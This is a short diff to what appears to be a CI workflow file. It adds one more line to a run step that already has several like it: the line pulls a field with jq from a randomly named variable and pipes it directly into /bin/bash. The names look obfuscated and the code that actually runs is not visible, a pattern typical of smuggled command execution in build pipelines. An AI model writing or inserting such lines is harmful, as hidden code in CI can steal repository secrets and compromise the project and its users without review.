@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$rock26" | jq -r .cacws4212 | /bin/bash
           echo $tfu7 | jq -r .sbw046 | /bin/bash
           printf '%s' "$nev58937" | jq -r .htqu5343 | /bin/bash
+          echo $akk06901 | jq -r .eou82 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
